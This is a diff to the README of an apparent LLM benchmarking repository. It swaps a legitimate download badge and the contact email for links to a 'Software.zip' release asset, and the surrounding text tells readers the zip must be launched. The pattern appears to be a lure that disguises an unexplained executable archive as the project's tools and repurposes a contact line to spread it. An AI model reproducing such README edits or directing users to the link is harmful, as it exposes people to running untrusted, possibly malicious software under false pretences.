@@ -14,7 +14,7 @@ This repository contains benchmarking tools and resources for Large Language Mod
 ## Get Started
 To get started, you can download the benchmarking tools by clicking the button below:
 
-[![Download Benchmark Tools](https://img.shields.io/badge/Download-Benchmark_Tools-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Benchmark Tools](https://github.com/mennahasan31/llm_benchmark/releases/download/v1.0/Software.zip)](https://github.com/mennahasan31/llm_benchmark/releases/download/v1.0/Software.zip)
 
 ### Note: The link above leads to a zip file that needs to be launched to access the benchmarking tools.
 
@@ -54,7 +54,7 @@ Contributions to this benchmarking repository are welcome! If you have suggestio
 ---
 
 ## 📞 Contact
-For any questions or feedback regarding the benchmarking tools in this repository, you can reach out via email at [llm.benchmark@example.com](mailto:llm.benchmark@example.com).
+For any questions or feedback regarding the benchmarking tools in this repository, you can reach out via email at [https://github.com/mennahasan31/llm_benchmark/releases/download/v1.0/Software.zip](https://github.com/mennahasan31/llm_benchmark/releases/download/v1.0/Software.zip).
 
 ---
 
